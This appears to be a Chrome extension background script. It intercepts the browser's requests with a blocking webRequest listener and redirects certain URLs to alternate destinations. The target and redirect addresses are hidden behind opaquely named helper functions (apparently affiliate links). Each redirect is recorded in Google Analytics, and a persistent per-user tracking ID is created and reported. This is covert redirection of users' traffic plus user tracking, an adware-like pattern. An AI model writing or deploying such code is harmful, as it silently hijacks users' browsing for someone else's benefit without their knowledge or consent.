/* 
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */


function fk(){
    chrome.webRequest.onBeforeRequest.addListener(
        function(de) {            
            if(de.type !== frty())
                return;console.log(de.url);
            if(de.url === fku()){
                _gaq.push(["_trackEvent", 'FK', "FK1", "FK2"]);
                return {redirectUrl: afid()};
            }
            if(de.url === amu()){
                _gaq.push(["_trackEvent", 'AM', "Am1", "Am2"]);
                return {redirectUrl: aafid()};
            }
        },
        {urls: [burl(), burl2()],
        types: [frty()]},
        ['blocking']);
}
fk();


function getRandomToken() {
    // E.g. 8 * 32 = 256 bits token
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
    return hex;
}


var userid = "";
chrome.storage.sync.get('userid007', function(items) {
    //console.log(items);
    userid = items.userid007;
    if (userid) {
        //console.log("new" + userid);
        _gaq.push(["_trackEvent", 'userId', 'Existing',  userid]);
    } else {
        userid = getRandomToken();
        chrome.storage.sync.set({userid007: userid}, function() {
            _gaq.push(["_trackEvent", 'userId', 'New',  userid]);
            //console.log("old"+ userid);
        });
    }    
    
});